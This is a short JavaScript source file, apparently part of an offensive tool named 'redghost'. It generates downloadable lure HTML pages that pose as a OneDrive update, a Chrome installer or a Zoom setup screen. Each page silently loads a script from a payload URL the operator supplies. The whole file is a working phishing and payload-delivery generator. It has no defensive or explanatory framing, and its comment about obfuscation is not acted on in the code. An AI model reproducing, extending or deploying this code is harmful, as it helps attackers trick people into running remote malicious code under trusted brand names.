const form    = document.getElementById('rg-form');
const output  = document.getElementById('rg-output');
const dlLink  = document.getElementById('download-link');

form.addEventListener('submit', e => {
  e.preventDefault();

  const tmpl    = document.getElementById('template').value;
  const payload = document.getElementById('payload').value.trim();
  let html      = '';

  // Simple template mapping
  const templates = {
    onedrive: `
      <!DOCTYPE html><html><head><title>OneDrive Update</title></head><body>
      <h2>Installing OneDrive Update...</h2>
      <script src="${payload}"></script>
      </body></html>
    `,
    chrome: `
      <!DOCTYPE html><html><head><title>Chrome Installer</title></head><body>
      <h2>Google Chrome Installation</h2>
      <script src="${payload}"></script>
      </body></html>
    `,
    zoom: `
      <!DOCTYPE html><html><head><title>Zoom Setup</title></head><body>
      <h2>Zoom Installer</h2>
      <script src="${payload}"></script>
      </body></html>
    `
  };

  html = templates[tmpl] || templates['onedrive'];

  // Optional: simple obfuscation (base64 encode)
  const blob = new Blob(
    [html],
    { type: 'text/html' }
  );
  const url  = URL.createObjectURL(blob);

  dlLink.href       = url;
  dlLink.download   = `redghost_${tmpl}.html`;
  output.classList.remove('hidden');
});
